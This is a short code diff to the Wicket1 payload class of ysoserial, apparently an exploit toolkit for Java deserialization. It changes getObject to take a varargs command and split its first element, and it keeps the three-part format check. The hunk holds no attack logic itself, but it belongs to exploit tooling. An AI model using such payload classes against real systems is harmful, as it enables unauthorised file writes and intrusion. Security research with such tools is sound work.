@@ -51,9 +51,9 @@ import ysoserial.payloads.util.Reflections;
 @Authors({ Authors.JACOBAINES })
 public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
 
-    public DiskFileItem getObject(String command) throws Exception {
+    public DiskFileItem getObject(String ... command) throws Exception {
 
-        String[] parts = command.split(";");
+        String[] parts = command[0].split(";");
 
         if (parts.length != 3) {
         	throw new IllegalArgumentException("Bad command format.");
